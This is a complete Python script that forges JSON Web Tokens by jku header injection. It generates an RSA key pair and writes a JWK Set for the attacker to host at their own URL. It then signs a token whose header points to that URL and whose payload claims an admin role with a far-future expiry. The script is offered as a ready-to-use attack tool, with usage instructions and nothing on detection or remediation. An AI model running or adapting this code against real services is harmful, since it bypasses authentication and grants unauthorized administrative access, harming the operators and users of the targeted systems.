#!/usr/bin/env python3
"""Forge an RS256 JWT with a malicious jku (JWK Set URL) pointing at an
attacker-hosted JWKS. Use after confirming the target reads `jku` from the token
header and fetches it to verify (jku injection / "bring your own key").

Usage:
  python3 forge_jwt_jku.py --jku https://host/jwks.json --kid attacker-key-1 \
      --role admin --sub victim --outdir .

Outputs (in --outdir):
  byok_priv.pem      your RSA private key (signs the forged token)
  byok_pub.pem       your public key
  byok_jwks.json     JWK Set to host at --jku
  forged_token.txt   the forged RS256 token (admin)
"""
import argparse, base64, json, os
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt  # pip install pyjwt  (use a venv: python3 -m venv venv && . venv/bin/activate && pip install pyjwt cryptography requests)


def b64url_uint(n: int) -> str:
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--jku", required=True, help="Publicly reachable URL where you will host byok_jwks.json")
    ap.add_argument("--kid", default="attacker-key-1")
    ap.add_argument("--role", default="admin")
    ap.add_argument("--sub", default="attacker")
    ap.add_argument("--exp", type=int, default=9999999999)
    ap.add_argument("--outdir", default=".")
    a = ap.parse_args()

    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv_pem = priv.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    )
    pub = priv.public_key()
    pub_pem = pub.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    nums = pub.public_numbers()
    jwk = {
        "kty": "RSA",
        "use": "sig",
        "kid": a.kid,
        "n": b64url_uint(nums.n),
        "e": b64url_uint(nums.e),
    }
    jwks = {"keys": [jwk]}

    os.makedirs(a.outdir, exist_ok=True)
    open(f"{a.outdir}/byok_priv.pem", "wb").write(priv_pem)
    open(f"{a.outdir}/byok_pub.pem", "wb").write(pub_pem)
    open(f"{a.outdir}/byok_jwks.json", "w").write(json.dumps(jwks, indent=2))

    header = {"alg": "RS256", "typ": "JWT", "jku": a.jku, "kid": a.kid}
    payload = {"exp": a.exp, "role": a.role, "sub": a.sub}
    tok = jwt.encode(payload, priv, algorithm="RS256", headers=header)
    if isinstance(tok, bytes):
        tok = tok.decode()
    open(f"{a.outdir}/forged_token.txt", "w").write(tok)

    print("JWKS (host this at --jku):", f"{a.outdir}/byok_jwks.json")
    print("Forged token:\n", tok)


if __name__ == "__main__":
    main()
